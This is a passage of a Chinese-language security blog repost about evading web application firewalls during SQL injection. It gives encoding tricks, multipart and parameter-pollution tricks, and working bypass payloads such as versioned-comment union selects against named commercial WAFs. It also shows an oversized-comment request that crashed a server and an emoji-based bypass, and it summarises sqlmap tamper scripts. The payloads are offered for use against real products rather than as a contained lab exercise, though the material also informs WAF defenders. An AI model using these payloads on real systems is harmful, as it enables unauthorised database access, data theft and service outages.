<p>asp+iis的环境中，当我们请求的url中存在单一的百分号%时，iis+asp会将其忽略掉，而没特殊要求的waf当然是不会的：<br><img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_8_1.jpg"><br> 修复方式应该就是检测这种百分号%的周围是否能拼凑成恶意的关键字吧。</p>
<ul>
<li>%u特性：</li>
</ul>
<p>iis支持unicode的解析，当我们请求的url存在unicode字符串的话iis会自动将其转换，但waf就不一定了：<br><img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_8_2.jpg"><br> 修复过后：<br><img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_9_1.jpg"><br> 这个特性还存在另一个case，就是多个widechar会有可能转换为同一个字符。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s%u0065lect-&gt;select</span><br><span class="line">s%u00f0lect-&gt;select</span><br></pre></td></tr></table></figure>

<p>WAF对%u0065会识别出这是e，组合成了select关键字，但有可能识别不出%u00f0<br><img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_9_2.jpg"><br> 其实不止这个，还有很多类似的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">字母a：</span><br><span class="line">%u0000</span><br><span class="line">%u0041</span><br><span class="line">%u0061</span><br><span class="line">%u00aa</span><br><span class="line">%u00e2</span><br><span class="line">单引号：</span><br><span class="line">%u0027</span><br><span class="line">%u02b9</span><br><span class="line">%u02bc</span><br><span class="line">%u02c8</span><br><span class="line">%u2032</span><br><span class="line">%uff07</span><br><span class="line">%c0%27</span><br><span class="line">%c0%a7</span><br><span class="line">%e0%80%a7</span><br><span class="line">空白：</span><br><span class="line">%u0020</span><br><span class="line">%uff00</span><br><span class="line">%c0%20</span><br><span class="line">%c0%a0</span><br><span class="line">%e0%80%a0</span><br><span class="line">左括号(：</span><br><span class="line">%u0028</span><br><span class="line">%uff08</span><br><span class="line">%c0%28</span><br><span class="line">%c0%a8</span><br><span class="line">%e0%80%a8</span><br><span class="line">右括号)：</span><br><span class="line">%u0029</span><br><span class="line">%uff09</span><br><span class="line">%c0%29</span><br><span class="line">%c0%a9</span><br><span class="line">%e0%80%a9</span><br></pre></td></tr></table></figure>

<ul>
<li>畸形协议&amp;请求：</li>
</ul>
<p>asp/asp.net：</p>
<p>还有asp/asp.net在解析请求的时候，允许application/x-www-form-urlencoded的数据提交方式，不管是GET还是POST，都可正常接收，过滤GET请求时如果没有对application/x-www-form-urlencoded提交数据方式进行过滤，就会导致任意注入。</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_11_1.jpg">

<p>php+Apache：</p>
<p>waf通常会对请求进行严格的协议判断，比如GET、POST等，但是apache解析协议时却没有那么严格，当我们将协议随便定义时也是可以的：</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_11_2.jpg">

<p>PHP解析器在解析multipart请求的时候，它以逗号作为边界，只取boundary，而普通解析器接受整个字符串。 因此，如果没有按正确规范的话，就会出现这么一个状况：首先填充无害的data，waf将其视为了一个整体请求，其实还包含着恶意语句。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">------,xxxx</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;img&quot;; filename&#x3D;&quot;img.gif&quot;</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">------</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;id&quot;</span><br><span class="line"></span><br><span class="line">1&#39; union select null,null,flag,null from flag limit 1 offset 1-- -</span><br><span class="line">--------</span><br><span class="line">------,xxxx--</span><br></pre></td></tr></table></figure>

<p><code>通用的特性</code>：</p>
<ul>
<li>HPP：</li>
</ul>
<p>HPP是指HTTP参数污染-HTTP Parameter Pollution。当查询字符串多次出现同一个key时，根据容器不同会得到不同的结果。</p>
<p>假设提交的参数即为：</p>
<p>id=1&amp;id=2&amp;id=3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Asp.net + iis：id&#x3D;1,2,3 Asp + iis：id&#x3D;1,2,3 Php + apache：id&#x3D;3</span><br></pre></td></tr></table></figure>

<ul>
<li>双重编码：</li>
</ul>
<p>这个要视场景而定，如果确定一个带有waf的site存在解码后注入的漏洞的话，会有效避过waf。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlencodebase64jsonbinaryquerystringhtmlencodeunicodephp serialize</span><br></pre></td></tr></table></figure>

<ul>
<li>我们在整体测试一个waf时，可测试的点都有哪些？</li>
</ul>
<p>  GET、POST、HEADER那么我们专门针对一个waf进行测试的时候就要将这几个点全测试个遍，header中还包括Cookie、X-Forwarded-For等，往往除了GET以外其他都是过滤最弱的。</p>
<h4 id="0x03-见招拆招"><a href="#0x03-见招拆招" class="headerlink" title="0x03 见招拆招"></a><strong>0x03 见招拆招</strong></h4><p>  “正则逃逸大法”：或许大家没听说过这个名词，因为是我起的。我发现很多waf在进行过滤新姿势的时候很是一根筋，最简单的比方，过滤了%23%0a却不过滤%2d%2d%0a？上面提到八成的waf都被%23%0a所绕过。</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_13_1.jpg">

<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_13_2.jpg">

<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_13_3.jpg">

<p>  科学计数法1union、1from？多次被坑的安全宝&amp;百度云加速&amp;Imperva：</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_14_1.jpg">

<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_14_2.jpg">

<p>  过滤了union+select+from，那我select+from+union呢？使用Mysql自定义变量的特性就可以实现，这里举一个阿里云盾的案例：</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_14_3.jpg">

<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_15_1.jpg">

<p>  由于后面在调用自定义变量的时候需要用到union+select，所以还需要绕过这个点。/<em>ddd</em>/union/<em>ddd</em>/select 就可以了。</p>
<p>Bypass Payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1|@pwd:&#x3D;(select username from users where id&#x3D;4)&#x2F;*ddd*&#x2F;union&#x2F;*ddd*&#x2F;select null,@pwd</span><br></pre></td></tr></table></figure>

<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_15_2.jpg">

<p>  如何做到通过推理绕过waf？这里举一个腾讯云安全的案例：</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_16_1.jpg">

<p>绕过思路:<br> 首先看看腾讯云安全怎么检测sql注入的，怎么匹配关键字会被拦截，怎么匹配不会?</p>
<ul>
<li>union+select拦截</li>
<li>select+from拦截</li>
<li>union+from不拦截</li>
</ul>
<p>那么关键的点就是绕过这个select关键字</p>
<ul>
<li>select all</li>
<li>select distinct</li>
<li>select distinctrow</li>
</ul>
<p>既然这些都可以，再想想使用这样的语句怎么不被检测到？select与all中间肯定不能用普通的/**/这种代替空格，还是会被视为是union+select。select all可以这么表达/<em>!12345select all</em>/，腾讯云早已识破这种烂大街的招式。尝试了下/<em>!</em>/中间也可以使用%0a换行。</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_16_2.jpg">

<p>/<em>!12345%0aselect%20all</em>/还是会被拦截，这就说明腾讯云在语法检测的时候会忽略掉数字后面的%0a换行，虽然属于union+12342select，但简单的数字和关键字区分识别还是做得到。再测试/<em>!12345select%0aall</em>/，结果就合乎推理了，根据测试知道腾讯云安全会忽略掉%0a换行，这就等于union+12345selectall， 不会被检测到。（忽略掉%0a换行为了过滤反而可以用来加以利用进行Bypass）</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_17_1.jpg">

<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_17_2.jpg">

<p>可能会问，推理的依据并不能真正意义上证明忽略掉了%0a啊？当然要证明下啊，/<em>!12345%0aselect%0aall</em>/就被拦截了，说明刚开始检测到12345%0aselect就不再检测后方的了，union+12345select就已经可以拦截掉了。</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_17_3.jpg">

<p>还可能会问，既然忽略掉了%0a，那么/<em>!select%0aall</em>/是不是也可以啊，然而并不行。合理的推理很有必要。</p>
<p>  Bypass Payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union&#x2F;*!50000select%0aall*&#x2F;username from users%231&#39; union&#x2F;*!50000select%0adistinct*&#x2F;username from users%231&#39; union&#x2F;*!50000select%0adistinctrow*&#x2F;username from users%23</span><br></pre></td></tr></table></figure>

<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_18_1.jpg">

<p>  不是绕不过狗，只是不够细心：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union+select拦截。select+from拦截。union+from不拦截。fuzz了下&#x2F;*!50000select*&#x2F;这个5位数，前两位数&lt;50 &amp;&amp; 第二位!&#x3D;&#x3D;0 &amp;&amp; 后三位数&#x3D;&#x3D;0即可bypass。(一点细节也不要放过。)</span><br></pre></td></tr></table></figure>

<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_19_1.jpg">

<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_19_2.jpg">

<p>测试环境</p>
<blockquote>
<p>Windows Server 2008 + APACHE + PHP + Mysql Bypass Payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union&#x2F;*!23000select*&#x2F;user,password from users%23</span><br></pre></td></tr></table></figure>
</blockquote>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_20_1.jpg">

<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_20_2.jpg">
  这里证明一个观点：好姿势不是死的，零零碎碎玩不转的姿势巧妙的结合一下。所以说一个姿势被拦截不代表就少了一个姿势。

<h4 id="0x04-别按套路出牌"><a href="#0x04-别按套路出牌" class="headerlink" title="0x04 别按套路出牌"></a><strong>0x04 别按套路出牌</strong></h4><p>  云锁版本迭代导致的 &amp; 360主机卫士一直存在的问题：</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_21_1.jpg">

<p>  注意POST那个方向，waf在检测POST传输的数据过程中，没有进行URL的检测，也就是说waf会认为URL上的任何参数信息都是正常的。既然是POST请求，那就只检测请求正文咯。(神逻辑)</p>
<p>  在标准HTTP处理流程中，只要后端有接收GET形式的查询字段，即使客户端用POST传输，查询字符串上满足查询条件时，是会进行处理的。（没毛病）</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_21_2.jpg">

<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_22_1.jpg">

<p>  当waf成了宕机的罪魁祸首是什么样的？举一个安全狗的案例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*66666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666*&#x2F;</span><br></pre></td></tr></table></figure>

<p>  注释中包含超长查询字符串，导致安全狗在识别的过程中挂掉了，连带着整个机器Service Unavailable：</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_23_1.jpg">

<p>  再举一个云锁也是因为数据包过长导致绕过的案例：</p>
<p>  云锁在开始检测时先判断包的大小是否为7250byte以下，n为填充包内容，设置n大小为2328时，可以正常访问页面，但是会提示拦截了SQL注入</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_23_2.jpg">

<p>  当数据包超过2329时就可以成功绕过，2329长度以后的就不检测了。？</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_23_3.jpg">

<h4 id="0x05-猥琐很重要"><a href="#0x05-猥琐很重要" class="headerlink" title="0x05 猥琐很重要"></a><strong>0x05 猥琐很重要</strong></h4><p>  这里讲个有意思的案例，并且是当时影响了安全宝、阿里云盾的姿势：</p>
<p>  有次睡前想到的，emoji图标！是的，平时做梦并没有美女与野兽。当时只是随便一想，第二天问了5up3rc，他说他也想过，但测试并没有什么效果。</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_24_1.jpg">

<p>  emoji是一串unicode字集组成，一个emoji图标占5个字节，mysq也支持emoji的存储，在mysql下占四个字节:</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_24_2.jpg">

<p>  既然在查询的时候%23会忽略掉后面的，那么Emoji就可以插入到%23与%0A之间。再加多试了试，成功绕过了，200多个emoji图标，只能多，但少一个都不行。。。</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_25_1.jpg">

<p>  可能会说，这是因为超⻓查询导致的绕过吧?并不是。</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_25_2.jpg">

<p>  这么⻓，mysql也是会执行的:</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_25_3.jpg">

<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_26_1.jpg">

<p>  我们再来测试阿里云盾：</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_26_2.jpg">

<p>  绕过了。。。事情还没看起来这么简单。</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_26_3.jpg">

<p>  当缩少emoji数量的话会拦截，想想还是再加多些试试:</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_27_1.jpg">

<p>  还是拦截，那刚才的没拦截是怎么回事?点根烟，逐一进行排查。发现能绕过的原因和emoji数量无关，而是某个emoji可以。</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_27_2.jpg">

<p>  就是这个愤怒的emoji，其他的emoji都不行。唯独愤怒脸可以:</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_28_1.jpg">

<p>  将这些emoji进行urlencode看看特征，究竟是什么原因?看看哪些emoji插入不会被拦截:</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_28_2.jpg">

<p>  有些emoji进行urlencode后是很⻓的，因为是几个emoji进行组合的。</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_29_1.jpg">

<p>  将这些payload进行注入进去。</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_29_2.jpg">

<p>  难道只有这个愤怒脸插入进去就可以绕过?也不能这么说，我发现能绕过的字符都是ascii码超过了127的字符：</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_30_1.jpg">

<p>  那为什么愤怒脸的emoji可以?这里提到emoji的特征，常⻅的emoji是四位组成，前三位多数是一致的，把这三位插入payload试试:</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_30_2.jpg">

<p>  可以实现绕过，再来看看愤怒脸的urlencode:</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_30_3.jpg">

<p>  最后一位是%a0，那么也就是说完全可以忽略掉最后一位，而多数emoji第四位是 &lt; ascii 127的，所以达到绕过的只是 &gt; ascii 127的字符，会导致waf引擎无法检测。</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_31_1.jpg">

<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_31_2.jpg">

<p>  我是个技术人，虽然这是异想天开没有任何根据的想法，但仍愿意去尝试。courage to try！</p>
<h4 id="0x06-自动化Bypass"><a href="#0x06-自动化Bypass" class="headerlink" title="0x06 自动化Bypass"></a><strong>0x06 自动化Bypass</strong></h4><p>首先总结下sqlmap的各种bypass waf tamper：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apostrophemask.py 用UTF-8全角字符替换单引号字符apostrophenullencode.py 用非法双字节unicode字符替换单引号字符appendnullbyte.py 在payload末尾添加空字符编码base64encode.py 对给定的payload全部字符使用Base64编码between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“&#x3D;”bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“&#x3D;”chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例equaltolike.py 用“LIKE”运算符替换全部等于号“&#x3D;”greatest.py 用“GREATEST”函数替换大于号“&gt;”halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例lowercase.py 用小写值替换每个关键字字符modsecurityversioned.py 用注释包围完整的查询modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询multiplespaces.py 在SQL关键字周围添加多个空格nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器overlongutf8.py 转换给定的payload当中的所有字符percentage.py 在每个字符之前添加一个百分号randomcase.py 随机转换每个关键字字符的大小写randomcomments.py 向SQL关键字中插入随机注释securesphere.py 添加经过特殊构造的字符串sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logsspace2comment.py 用“&#x2F;**&#x2F;”替换空格符space2dash.py 用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符space2plus.py 用加号“+”替换空格符space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAFversionedkeywords.py 用MySQL注释包围每个非函数关键字versionedmorekeywords.py 用MySQL注释包围每个关键字xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</span><br></pre></td></tr></table></figure>

<p>看起来很全，但有个缺点就是功能单一，灵活程度面对当今的主流waf来说很吃力了。 鉴于多数waf产品是使用Rule进行防护，那么这里也不提什么高大上的机器学习。就是简 单粗暴的fuzz。 去年黄登提到过建立有毒标示模型，根据这个模型将waf进行训练。</p>
<p>![我的WafBypass之道（SQL注入篇）_33_1](E:\blog\myblog\source_posts\SQL注入绕waf/我的WafBypass之道（SQL注入篇）_33_1.jpg”&gt;</p>
<p>我把每个sql关键字两侧可插入的点称之为“位”，最基本的一句注入语句就有这些位：</p>
<p>![我的WafBypass之道（SQL注入篇）_33_2](E:\blog\myblog\source_posts\SQL注入绕waf/我的WafBypass之道（SQL注入篇）_33_2.jpg”&gt;</p>
<p>​            假设有n个有毒标示</p>
<p>​            最基本的诸如语句可以插入五个位</p>
<p>​            这五个定义位a1，a2 . . . a5</p>
<p>​            那么结果将会是多少呢？</p>
<p>​            a1^n + a2^n + a3^n + a4^n + a5^n</p>
<p>这个是叠加的，关键字不止这些，稍微复杂一点的环境就会需要更多的关键字来注入， 也就会需要fuzz更多的位。 </p>
<p>还需要经过各种编码过后，根据数据库的样式使用相应的特性和配合的函数等等。</p>
<p>当前几个关键字达到绕过效果时，只需继续fuzz后面几个位即可。</p>
<p>还有就是传输过程中可测试的点：</p>
<p>![我的WafBypass之道（SQL注入篇）_33_3](E:\blog\myblog\source_posts\SQL注入绕waf/我的WafBypass之道（SQL注入篇）_33_3.jpg”&gt;</p>
<p>因为当我们在传输的过程中导致的绕过往往是致命的，比如中间件的特性/缺陷，导致 waf不能识别或者是在满足特定条件下的欺骗了waf。</p>
<h4 id="0x07-End"><a href="#0x07-End" class="headerlink" title="0x07 End"></a><strong>0x07 End</strong></h4><p> 一写起来就根本停不起来，后期决定出一系列waf绕过文，例如文件上传、webshell 防御、权限提升等Waf绕过。xss的bypass就算了，防不胜防…（如果又想到什么有趣的 手法的话，我会以下面回帖的方式给大家）</p>
<p><strong>转载声明</strong></p>
<blockquote>
<p>本文转载自先知社区：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/368%E3%80%90%E6%88%91%E7%9A%84WafBypass%E4%B9%8B%E9%81%93%EF%BC%88SQL%E6%B3%A8%E5%85%A5%E7%AF%87%EF%BC%89%E3%80%91">https://xz.aliyun.com/t/368【我的WafBypass之道（SQL注入篇）】</a></p>
</blockquote>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/04/02/BurpSuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97%E4%B9%8BPython%E7%AF%87/" rel="prev" title="BurpSuite插件开发指南之Python篇">
      <i class="fa fa-chevron-left"></i> BurpSuite插件开发指南之Python篇
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-%E6%90%9E%E8%B5%B7"><span class="nav-number">2.</span> <span class="nav-text">0x01 搞起</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1%E3%80%81%E4%BA%91waf%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">1、云waf：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2%E3%80%81%E4%B8%BB%E6%9C%BA%E9%98%B2%E6%8A%A4%E8%BD%AF%E4%BB%B6%EF%BC%9A"><span class="nav-number">2.2.</span> <span class="nav-text">2、主机防护软件：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3%E3%80%81%E7%A1%AC%E4%BB%B6ips-ids%E9%98%B2%E6%8A%A4%E3%80%81%E7%A1%AC%E4%BB%B6waf%EF%BC%88%E8%BF%99%E9%87%8C%E5%85%88%E4%B8%8D%E8%AE%B2%EF%BC%89"><span class="nav-number">2.3.</span> <span class="nav-text">3、硬件ips&#x2F;ids防护、硬件waf（这里先不讲）</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-%E5%8F%B8%E7%A9%BA%E8%A7%81%E6%83%AF"><span class="nav-number">3.</span> <span class="nav-text">0x02 司空见惯</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-%E8%A7%81%E6%8B%9B%E6%8B%86%E6%8B%9B"><span class="nav-number">4.</span> <span class="nav-text">0x03 见招拆招</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-%E5%88%AB%E6%8C%89%E5%A5%97%E8%B7%AF%E5%87%BA%E7%89%8C"><span class="nav-number">5.</span> <span class="nav-text">0x04 别按套路出牌</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x05-%E7%8C%A5%E7%90%90%E5%BE%88%E9%87%8D%E8%A6%81"><span class="nav-number">6.</span> <span class="nav-text">0x05 猥琐很重要</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x06-%E8%87%AA%E5%8A%A8%E5%8C%96Bypass"><span class="nav-number">7.</span> <span class="nav-text">0x06 自动化Bypass</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x07-End"><span class="nav-number">8.</span> <span class="nav-text">0x07 End</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="一灯和尚"
      src="/images/46807619.jpg">
  <p class="site-author-name" itemprop="name">一灯和尚</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">7</span>
          <span class="site-state-item-name">文章</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
